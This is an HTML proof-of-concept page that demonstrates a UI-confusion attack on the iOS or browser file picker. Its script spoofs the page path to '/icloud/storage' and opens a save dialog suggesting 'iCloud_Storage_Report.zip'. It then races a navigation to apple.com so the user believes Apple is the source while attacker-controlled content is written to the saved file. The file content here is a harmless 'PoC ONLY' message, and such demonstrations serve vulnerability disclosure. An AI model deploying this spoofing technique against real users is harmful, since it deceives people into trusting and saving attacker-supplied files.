<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>iOS File Picker UI Confusion PoC</title>
</head>
<body>

<h1 id="trigger">Tap to continue</h1>

<script>
const trigger = document.getElementById('trigger');

trigger.addEventListener('click', async () => {
  if (!window.showSaveFilePicker) return;

  // Step 1: Make URL look trusted
  history.pushState({}, '', '/icloud/storage');

  try {
    // Step 2: Native file picker (trusted UI)
    const handle = await showSaveFilePicker({
      suggestedName: 'iCloud_Storage_Report.zip',
      types: [{
        description: 'ZIP Archive',
        accept: { 'application/zip': ['.zip'] }
      }]
    });

    // Step 3: Navigation race (origin confusion)
    setTimeout(() => {
      location.href = 'https://www.apple.com';
    }, 60);

    // Step 4: Attacker-controlled content
    const writable = await handle.createWritable();
    await writable.write(
      'PoC ONLY\n' +
      'This ZIP was created by an attacker-controlled origin\n' +
      'User believed it came from iCloud / Apple'
    );
    await writable.close();

  } catch (e) {
    // user cancel expected
  }
}, { once: true });
</script>

</body>
</html>
